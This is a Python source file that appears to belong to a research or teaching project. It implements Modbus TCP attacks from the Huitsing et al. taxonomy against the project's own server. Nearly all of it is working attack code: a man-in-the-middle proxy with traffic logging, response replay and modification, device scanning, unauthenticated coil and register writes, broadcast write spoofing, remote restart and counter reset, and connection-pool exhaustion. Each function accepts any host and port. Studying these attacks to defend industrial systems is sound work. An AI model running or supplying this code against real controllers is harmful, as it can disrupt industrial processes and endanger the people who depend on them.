"""
attacks.py
==========
Representative attacks from the Modbus attack taxonomy of Huitsing et al.
(IJCIP, 2008), implemented against the real Modbus TCP server in this project.
Every attack is mapped to its taxonomy designator and threat category:

  Threat        Paper attack(s)                 implemented here
  -----------   -----------------------------   ---------------------------
  Interception  B9 Passive Reconnaissance,      sniff_via_proxy / scan_network
                B6 Modbus Network Scanning,
                S5 Slave Reconnaissance
  Modification  B4 Direct Slave Control,        unauthorized_command,
                B2 Baseline Response Replay       replay_via_proxy
  Interruption  S4 Remote Restart,              remote_restart,
                T10 TCP Pool Exhaustion           pool_exhaustion
  Fabrication   B1 Broadcast Message Spoofing,  broadcast_spoof,
                B14 Rogue Interloper (MITM)       MitmProxy

The Modbus protocol offers no authentication, so none of these attacks needs a
credential — exactly the point made by the taxonomy paper.
"""

from __future__ import annotations

import socket
import struct
import threading
import time

import modbus_protocol as mb
from modbus_client import ModbusClient


# ===========================================================================
# Rogue Interloper (B14) — a man-in-the-middle TCP proxy.
# The master is pointed at the proxy; the proxy relays to the real slave and
# can passively log (B9/B14-1), replay (B2), or modify (B14-9/11) traffic.
# ===========================================================================
class MitmProxy:
    def __init__(self, listen_port, target_host="127.0.0.1", target_port=5020,
                 mode="passive"):
        self.listen_port = listen_port
        self.target = (target_host, target_port)
        self.mode = mode
        self.captured = []                 # decoded (direction, fc, summary) log
        self._frozen_response = {}         # fc -> response pdu  (for replay)
        self._modify = None                # callable(direction, mbap, pdu) -> pdu
        self._stop = threading.Event()
        self._sock = None
        self.active = False

    def set_modifier(self, fn):
        self._modify = fn

    def freeze_response_for(self, function):
        """After this is called, the next genuine response for `function` is
        recorded and then replayed for every subsequent matching request
        (Baseline Response Replay, B2)."""
        self._frozen_response[function] = None   # armed; filled on first capture

    def start(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(("127.0.0.1", self.listen_port))
        self._sock.listen(8)
        self._sock.settimeout(0.2)
        self.active = True
        threading.Thread(target=self._accept, daemon=True).start()
        return self

    def stop(self):
        self._stop.set()
        try:
            self._sock.close()
        except OSError:
            pass

    def _accept(self):
        while not self._stop.is_set():
            try:
                client, _ = self._sock.accept()
            except (socket.timeout, OSError):
                continue
            threading.Thread(target=self._bridge, args=(client,), daemon=True).start()

    def _bridge(self, client):
        try:
            upstream = socket.create_connection(self.target, 3)
        except OSError:
            client.close()
            return
        try:
            while not self._stop.is_set():
                req = mb.recv_frame(client, timeout=30)
                if not req:
                    break
                mbap, pdu = mb.parse_adu(req)
                fc = pdu[0]
                self.captured.append(("req", fc, mb.hexdump(req)))

                if self._modify:
                    pdu = self._modify("req", mbap, pdu) or pdu
                    req = mb.build_adu(mbap.transaction_id, mbap.unit_id, pdu)

                # Baseline Response Replay (B2): serve frozen stale data
                if fc in self._frozen_response and self._frozen_response[fc] is not None:
                    resp_pdu = self._frozen_response[fc]
                    client.sendall(mb.build_adu(mbap.transaction_id, mbap.unit_id,
                                                resp_pdu))
                    self.captured.append(("replay", fc, "served frozen response"))
                    continue

                upstream.sendall(req)
                resp = mb.recv_frame(upstream, timeout=30)
                if not resp:
                    break
                rmbap, rpdu = mb.parse_adu(resp)
                self.captured.append(("resp", rpdu[0], mb.hexdump(resp)))

                if fc in self._frozen_response and self._frozen_response[fc] is None:
                    self._frozen_response[fc] = rpdu       # capture baseline once

                if self._modify:
                    rpdu = self._modify("resp", rmbap, rpdu) or rpdu
                    resp = mb.build_adu(rmbap.transaction_id, rmbap.unit_id, rpdu)
                client.sendall(resp)
        except (OSError, ValueError):
            pass
        finally:
            for s in (client, upstream):
                try:
                    s.close()
                except OSError:
                    pass


# ===========================================================================
# B6 — Modbus Network Scanning  (Interception)
# Probe unit IDs and function codes to map a device with no prior knowledge.
# ===========================================================================
def scan_network(host, port, unit_ids=range(0, 4), reg_probe=8):
    found = []
    for uid in unit_ids:
        try:
            c = ModbusClient(host, port, unit_id=uid, timeout=1.0).connect()
        except OSError:
            continue
        try:
            sid = None
            try:
                sid = c.report_server_id()
            except Exception:
                pass
            # discover readable holding/input register ranges
            hold = _probe_range(c, mb.READ_HOLDING_REGISTERS, reg_probe)
            inp = _probe_range(c, mb.READ_INPUT_REGISTERS, reg_probe)
            coils = _probe_bits(c, mb.READ_COILS, reg_probe)
            if sid or hold or inp or coils:
                found.append({"unit_id": uid, "server_id": sid,
                              "holding": hold, "input": inp, "coils": coils})
        finally:
            c.close()
    return found


def _probe_range(client, fc, n):
    out = []
    for addr in range(n):
        try:
            pdu = mb.pdu_read(fc, addr, 1)
            vals = mb.parse_read_registers_response(client._transact(pdu))
            out.append((addr, vals[0]))
        except Exception:
            break
    return out


def _probe_bits(client, fc, n):
    try:
        return client.read_coils(0, n) if fc == mb.READ_COILS else None
    except Exception:
        return None


# ===========================================================================
# S5 — Slave Reconnaissance  (Interception): FC 17 Report Server ID
# ===========================================================================
def slave_recon(host, port, unit_id=1):
    with ModbusClient(host, port, unit_id=unit_id) as c:
        return c.report_server_id()


# ===========================================================================
# B4 — Direct Slave Control / Unauthorized Command Injection  (Modification /
#      Fabrication).  No authentication is required to write any coil/register.
# ===========================================================================
def unauthorized_command(host, port, writes, unit_id=1):
    """writes: list of ('coil'|'reg', address, value)."""
    done = []
    with ModbusClient(host, port, unit_id=unit_id) as c:
        for kind, addr, val in writes:
            if kind == "coil":
                c.write_coil(addr, bool(val))
            else:
                c.write_register(addr, int(val))
            done.append((kind, addr, val))
    return done


# ===========================================================================
# B1 — Broadcast Message Spoofing  (Fabrication): unit id 0, no response.
# ===========================================================================
def broadcast_spoof(host, port, kind, addr, val):
    """Send a write to unit-id 0 (broadcast). The slave acts but never replies,
    so the attack leaves no response trail."""
    sock = socket.create_connection((host, port), 3)
    try:
        if kind == "coil":
            pdu = mb.pdu_write_single_coil(addr, bool(val))
        else:
            pdu = mb.pdu_write_single_register(addr, int(val))
        sock.sendall(mb.build_adu(0x1234, 0, pdu))         # unit id 0 = broadcast
        sock.settimeout(0.8)
        try:
            replied = bool(sock.recv(16))
        except socket.timeout:
            replied = False
        return {"sent": mb.hexdump(mb.build_adu(0x1234, 0, pdu)), "got_response": replied}
    finally:
        sock.close()


# ===========================================================================
# S4 — Remote Restart  /  S1 — Diagnostic Register Reset  (Interruption / Mod.)
# ===========================================================================
def remote_restart(host, port, unit_id=1):
    with ModbusClient(host, port, unit_id=unit_id) as c:
        c.diagnostic(mb.DIAG_RESTART_COMM)


def diagnostic_reset(host, port, unit_id=1):
    with ModbusClient(host, port, unit_id=unit_id) as c:
        c.diagnostic(mb.DIAG_CLEAR_COUNTERS)


# ===========================================================================
# T10 — TCP Pool Exhaustion  (Interruption / DoS)
# Open and hold connections until the slave's bounded pool is full, then show a
# legitimate master being refused.
# ===========================================================================
def pool_exhaustion(host, port, n_sockets):
    held = []
    for _ in range(n_sockets):
        try:
            s = socket.create_connection((host, port), 1.0)
            # keep the connection alive but idle (a slow/again-and-again client)
            held.append(s)
            time.sleep(0.01)
        except OSError:
            break
    return held


def close_all(sockets):
    for s in sockets:
        try:
            s.close()
        except OSError:
            pass
